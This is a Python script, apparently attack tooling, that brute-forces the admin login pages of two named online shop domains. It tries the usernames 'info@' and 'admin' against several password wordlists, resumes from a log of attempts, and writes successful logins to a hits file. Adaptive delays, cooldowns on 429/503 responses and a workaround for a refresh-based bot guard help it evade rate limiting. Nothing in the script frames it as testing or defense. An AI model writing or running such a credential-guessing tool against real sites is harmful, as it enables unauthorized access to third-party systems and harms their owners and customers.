import sys, os, time, random
sys.path.insert(0, r"C:\work\hunt2")
from core import http

HOSTS = {"podarki-opt.ru": ["info@podarki-opt.ru", "admin"],
         "velo-toys.ru": ["info@velo-toys.ru", "admin"]}
GUARD = 'http-equiv="Refresh"'
BASE = "https://%s/admin/index.php"
LOG, HITS = "tried.txt", "hits.txt"

done, seen = set(), set()
if os.path.exists(LOG):
    for line in open(LOG, encoding="utf-8", errors="ignore"):
        done.add(line.rstrip("\n"))
print("уже пройдено:", len(done), flush=True)

sess = {h: http.session(h) for h in HOSTS}

def load(path, cap=0):
    out = []
    for w in open(path, encoding="utf-8", errors="ignore"):
        w = w.rstrip("\r\n").strip()
        if not w or len(w) > 40:
            continue
        k = w.lower()
        if k in seen:
            continue
        seen.add(k); out.append(w)
        if cap and len(out) >= cap:
            break
    return out

def hop(h):
    s, b = sess[h], BASE % h
    for _ in range(3):
        r = s.get(b, timeout=25)
        if GUARD not in r.content.decode("utf-8", "ignore"):
            return
        r = s.get(b + "?attempt=1", timeout=25)
        if GUARD not in r.content.decode("utf-8", "ignore"):
            return

def cool(sec, why):
    print("  ОТЛЕЖКА %ds (%s) %s" % (sec, why, time.strftime("%H:%M")), flush=True)
    for _ in range(sec):
        if os.path.exists("STOP"):
            sys.exit(0)
        time.sleep(1)

consec = total = 0
speed = 1.3
t0 = time.time()
for phase, cap in [("tier0.txt", 0), ("targets.txt", 0), (r"C:\work\dict\wl.txt", 10000), (r"C:\work\dict\L2.txt", 12000)]:
    words = load(phase, cap)
    print("ЭТАП %s: %d" % (phase, len(words)), flush=True)
    for w in words:
        for h, logins in HOSTS.items():
            for lg in logins:
                if os.path.exists("STOP"):
                    sys.exit(0)
                key = "%s|%s|%s" % (h, lg, w)
                if key in done:
                    continue
                try:
                    r = sess[h].post(BASE % h + "?route=common/login",
                                     data={"username": lg, "password": w},
                                     allow_redirects=False, timeout=25)
                except Exception as e:
                    consec += 1
                    print("  ERR %s %s %s" % (h, type(e).__name__, w), flush=True)
                    speed = min(2.5, speed * 1.4)
                    cool(30 if consec < 3 else 240, "ошибок %d" % consec)
                    continue
                consec = 0
                body = r.content.decode("utf-8", "ignore")
                if GUARD in body:
                    hop(h)
                    continue
                if r.status_code == 503:
                    cool(45, "503"); continue
                if r.status_code == 429:
                    cool(120, "429"); continue
                if r.status_code == 302 and "token=" in r.headers.get("location", ""):
                    print(">>> НАШЁЛ %s %s : %s" % (h, lg, w), flush=True)
                    open(HITS, "a", encoding="utf-8").write("%s %s %s\n" % (h, lg, w))
                open(LOG, "a", encoding="utf-8").write(key + "\n")
                total += 1
                if total % 25 == 0:
                    el = time.time() - t0
                    print("  %d попыток, %.1f мин, %.2f с/шт, темп %.2f" % (total, el / 60, el / total, speed), flush=True)
                speed = max(0.45, speed - 0.05)
                time.sleep(speed + random.uniform(0, 0.3))
print("словари кончились", flush=True)
